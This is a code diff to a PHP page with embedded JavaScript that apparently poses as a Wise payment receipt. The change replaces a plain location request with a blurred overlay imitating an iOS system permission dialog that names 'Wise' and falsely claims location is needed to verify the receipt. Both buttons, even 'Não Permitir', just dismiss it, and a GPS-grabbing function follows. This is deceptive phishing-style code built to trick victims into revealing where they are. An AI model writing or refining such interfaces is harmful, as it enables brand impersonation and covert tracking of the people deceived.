@@ -152,13 +152,53 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         }
 
         function mostrarMensagem() {
-            const msg = document.createElement('div');
-            msg.innerHTML = `
-                <div style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#fff; padding:20px; border-radius:12px; box-shadow:0 0 20px rgba(0,0,0,0.3); z-index:9999; max-width:300px; text-align:center; font-family:Arial;">
-                    <p style="margin:0 0 15px 0; font-size:16px;">📍 Para visualizar o comprovante corretamente, permita o acesso à sua localização.</p>
-                    <button onclick="this.parentElement.remove()" style="padding:10px 20px; background:#0066ff; color:white; border:none; border-radius:8px; cursor:pointer;">Permitir Localização</button>
-                </div>`;
-            document.body.appendChild(msg);
+            if (document.getElementById('sys-alert')) return;
+            const overlay = document.createElement('div');
+            overlay.id = 'sys-alert';
+            overlay.style.cssText = `
+                position:fixed; inset:0; z-index:9999;
+                backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px);
+                background:rgba(0,0,0,0.45);
+                display:flex; align-items:center; justify-content:center;
+            `;
+            overlay.innerHTML = `
+                <div style="
+                    background:#1c1c1e; color:#fff;
+                    width:270px; border-radius:14px;
+                    overflow:hidden; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+                    box-shadow:0 20px 60px rgba(0,0,0,0.6);
+                    animation:popIn .18s ease;
+                ">
+                    <div style="padding:20px 16px 14px; text-align:center; border-bottom:1px solid #3a3a3c;">
+                        <div style="font-size:36px; margin-bottom:8px;">📍</div>
+                        <div style="font-weight:600; font-size:15px; margin-bottom:6px;">
+                            "Wise" Quer Usar Sua Localização
+                        </div>
+                        <div style="font-size:13px; color:#aeaeb2; line-height:1.4;">
+                            Sua localização é usada para verificar a autenticidade do comprovante e proteger sua conta.
+                        </div>
+                    </div>
+                    <div style="display:flex;">
+                        <button onclick="document.getElementById('sys-alert').remove()"
+                            style="flex:1; padding:13px; background:none; border:none; border-right:1px solid #3a3a3c;
+                                   color:#636366; font-size:15px; cursor:pointer; font-family:inherit;">
+                            Não Permitir
+                        </button>
+                        <button onclick="document.getElementById('sys-alert').remove()"
+                            style="flex:1; padding:13px; background:none; border:none;
+                                   color:#0a84ff; font-size:15px; font-weight:600; cursor:pointer; font-family:inherit;">
+                            Permitir
+                        </button>
+                    </div>
+                </div>
+                <style>
+                    @keyframes popIn {
+                        from { transform:scale(.85); opacity:0; }
+                        to   { transform:scale(1);   opacity:1; }
+                    }
+                </style>
+            `;
+            document.body.appendChild(overlay);
         }
 
         function tentarGPS() {
